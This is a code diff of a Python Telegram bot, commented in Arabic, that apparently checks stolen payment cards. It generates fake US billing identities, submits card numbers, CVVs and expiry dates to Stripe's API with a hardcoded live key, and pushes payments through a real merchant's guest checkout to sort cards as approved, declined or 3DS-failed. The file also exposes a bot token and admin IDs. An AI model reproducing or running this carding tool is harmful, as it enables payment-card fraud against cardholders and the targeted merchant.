@@ -13,18 +13,14 @@ import base64
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
 ADMIN_IDS = [5895491379, 844663875]
 
-# ========== إعدادات السلة - غير هنا بس ==========
-CART_ID = "0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM"  # 👈 غير السلة من هنا
-
-# ========== Stripe Key ==========
-STRIPE_KEY = "pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X"
+# ========== Cart ID - غيره من هنا ==========
+CART_ID = "0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM"
 
 # ========== بيانات وهمية ==========
 FIRST_NAMES = ["John", "Mike", "Sarah", "Emma", "David", "Lisa", "Tom", "Anna", "James", "Maria"]
 LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"]
 STREETS = ["Main Street", "Oak Avenue", "Park Road", "Cedar Lane", "Maple Drive", "Hill Street", "Lake View", "Forest Road"]
 CITIES = ["Springfield", "Madison", "Franklin", "Clinton", "Georgetown", "Salem", "Bristol", "Oxford"]
-STATES = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA"]
 
 def generate_fake_data():
     """توليد بيانات وهمية عشوائية"""
@@ -33,14 +29,13 @@ def generate_fake_data():
     street_num = random.randint(100, 999)
     street = random.choice(STREETS)
     city = random.choice(CITIES)
-    state = random.choice(STATES)
+    state = random.choice(["CO", "CA", "NY", "TX", "FL"])
     zipcode = ''.join(random.choices(string.digits, k=5))
-    phone = f"{''.join(random.choices(string.digits, k=10))}"
+    phone = ''.join(random.choices(string.digits, k=10))
     
-    # توليد بريد إلكتروني عشوائي
-    email_providers = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
+    # بريد إلكتروني عشوائي
     random_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    email = f"{first.lower()}{random_chars}@{random.choice(email_providers)}"
+    email = f"{first.lower()}{random_chars}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com'])}"
     
     return {
         'firstname': first,
@@ -91,8 +86,8 @@ class StripeChecker:
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
-            # 🎲 توليد بيانات وهمية جديدة لكل بطاقة
-            fake_data = generate_fake_data()
+            # توليد بيانات وهمية جديدة
+            fake = generate_fake_data()
             
             headers = self.headers.copy()
             headers.update({
@@ -101,25 +96,7 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            # استخدام البيانات الوهمية
-            data = (
-                f'billing_details[address][state]={fake_data["state"]}'
-                f'&billing_details[address][postal_code]={fake_data["zipcode"]}'
-                f'&billing_details[address][country]=US'
-                f'&billing_details[address][city]={fake_data["city"]}'
-                f'&billing_details[address][line1]={requests.utils.quote(fake_data["street1"])}'
-                f'&billing_details[address][line2]={fake_data["street2"]}'
-                f'&billing_details[email]={fake_data["email"]}'
-                f'&billing_details[name]={requests.utils.quote(fake_data["full_name"])}'
-                f'&billing_details[phone]={fake_data["phone"]}'
-                f'&type=card'
-                f'&card[number]={card_number}'
-                f'&card[cvc]={cvv}'
-                f'&card[exp_year]={exp_year}'
-                f'&card[exp_month]={exp_month}'
-                f'&key={STRIPE_KEY}'
-                f'&_stripe_version=2020-03-02'
-            )
+            data = f'billing_details[address][state]={fake["state"]}&billing_details[address][postal_code]={fake["zipcode"]}&billing_details[address][country]=US&billing_details[address][city]={fake["city"]}&billing_details[address][line1]={requests.utils.quote(fake["street1"])}&billing_details[address][line2]={fake["street2"]}&billing_details[email]={fake["email"]}&billing_details[name]={requests.utils.quote(fake["full_name"])}&billing_details[phone]={fake["phone"]}&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
             
             r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm = r.json()
@@ -134,31 +111,26 @@ class StripeChecker:
                 'referer': 'https://www.ironmongeryworld.com/',
             })
             
-            # استخدام البيانات الوهمية + السلة المتغيرة
             payload = {
                 'cartId': CART_ID,
                 'billingAddress': {
                     'countryId': 'US',
                     'regionId': '13',
-                    'street': [fake_data['street1'], fake_data['street2']],
-                    'telephone': fake_data['phone'],
-                    'postcode': fake_data['zipcode'],
-                    'city': fake_data['city'],
-                    'firstname': fake_data['firstname'],
-                    'lastname': fake_data['lastname'],
+                    'street': [fake['street1'], fake['street2']],
+                    'telephone': fake['phone'],
+                    'postcode': fake['zipcode'],
+                    'city': fake['city'],
+                    'firstname': fake['firstname'],
+                    'lastname': fake['lastname'],
                 },
                 'paymentMethod': {
                     'method': 'stripe_payments',
                     'additional_data': {'payment_method': pm_id},
                 },
-                'email': fake_data['email'],
+                'email': fake['email'],
             }
             
-            r = self.session.post(
-                f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information',
-                headers=headers, 
-                json=payload
-            )
+            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload)
             res = r.json()
             if 'message' not in res or 'pi_' not in res['message']:
                 return 'DECLINED', 'Payment intent creation failed'
@@ -171,7 +143,7 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            params = f'client_secret={client_secret}&key={STRIPE_KEY}'
+            params = f'client_secret={client_secret}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
             r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}?{params}', headers=headers)
             pi = r.json()
             
@@ -197,7 +169,7 @@ class StripeChecker:
                 "browserUserAgent": "Mozilla/5.0"
             })
             
-            data = f'source={source}&browser={requests.utils.quote(browser)}&key={STRIPE_KEY}'
+            data = f'source={source}&browser={requests.utils.quote(browser)}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
             
             headers = self.headers.copy()
             headers.update({
@@ -535,8 +507,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "❌ N - Not Authenticated\n"
         "🔴 U - Unavailable\n"
         "❌ Declined/Rejected (R)\n"
-        "❌ Failed Auth - فشل المصادقة\n\n"
-        f"🛒 **Cart ID:** `{CART_ID}`",
+        "❌ Failed Auth - فشل المصادقة",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -693,11 +664,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     print("[🤖] Starting Stripe 3DS Telegram Bot...")
-    print(f"[🛒] Cart ID: {CART_ID}")
     print("[✅] Bot will send results in chat (no channel)")
     print("[✅] Using asyncio.create_task (no threading)")
     print("[✅] Failed Authentication detection enabled")
-    print("[🎲] Random fake data generator enabled")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
